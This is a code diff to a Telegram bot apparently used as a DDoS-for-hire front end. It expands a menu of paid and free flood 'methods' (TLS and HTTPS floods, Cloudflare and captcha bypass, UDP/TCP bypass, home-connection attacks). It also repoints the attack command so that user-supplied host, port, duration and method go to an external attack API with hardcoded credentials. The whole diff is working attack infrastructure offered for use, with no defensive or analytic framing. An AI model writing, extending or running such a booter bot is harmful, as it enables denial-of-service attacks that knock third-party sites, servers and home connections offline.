@@ -44,11 +44,22 @@ def send_help(message):
 def show_methods(message):
     methods_text = """
 <b>🍄 Vip Methods</b>
-<b> .tls-kill</b>: <code>TLS bypass only HTTPS</code>
-<b> .ovh-killer</b>: <code>Ovh Bypass TCP/UDP</code>
+<b> .TLS</b>: <code>TLS Flood only HTTPS</code>
+<b> .CLOUDFLARE</b>: <code>HTTPS Bypass reCaptcha/UAM</code>
+<b> .HTTP-BROWSER</b>: <code>Browser solve captcha</code>
+<b> .HTTP-RAPID</b>: <code>Rapid mixed with flood</code>
+<b> .HTTP-BYPASS</b>: <code>Normal Bypass HTTPS</code>
+<b> .RAW</b>: <code>Raw high rqs</code>
+<b> .UDPBYPASS</b>: <code>Udp bypass strong pw</code>
+<b> .TCPBYAPSS</b>: <code>Tcp bypass high gbps</code>
+<b> .SOCKET-TCP</b>: <code>Socket high bandwith</code>
+<b> .R6-BETA</b>: <code>R6 beta methods low power</code>
 ➖➖➖➖➖➖➖➖
 <b>🦐 Free Methods</b>
-<b> .browser</b>: <code>Raw power low requests</code>
+<b> .HTTP-XV</b>: <code>Raw power low requests</code>
+<b> .HTTPS</b>: <code>HTTPS Flood</code>
+<b> .UDP</b>: <code>Udp methods</code>
+<b> .HOME</b> <code>Home holder methods</code>
 """
     bot.reply_to(message, methods_text, parse_mode="HTML")
 
@@ -112,7 +123,7 @@ def attack_command(message):
         bot.reply_to(message, f"<b>Max Time is [{max_time}]</b>", parse_mode="HTML")
         return
 
-    api_url = f"http://api.ventox.id.vn/api/attack?username=ventox&key=ventox&host={host}&time={time}&port={port}&method={method}"
+    api_url = f"http://www.arthurc2.xyz:5555/api/attack?username=yui&secret=123123&host={host}&time={time}&port={port}&method={method}"
     response = requests.get(api_url)
     json_response = response.json()
 
